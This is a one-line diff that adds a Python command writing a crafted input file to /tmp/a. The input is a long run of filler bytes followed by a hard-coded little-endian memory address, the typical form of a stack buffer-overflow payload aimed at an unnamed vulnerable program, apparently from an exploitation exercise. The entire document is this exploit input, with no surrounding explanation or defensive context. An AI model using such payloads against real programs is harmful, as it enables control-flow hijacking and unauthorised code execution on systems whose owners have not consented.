@@ -1,0 +1,1 @@
+python -c 'print "A"*4095 + "\n" + "B"*14 + "\x40\xc5\xff\xff" + "A\n"' > /tmp/a
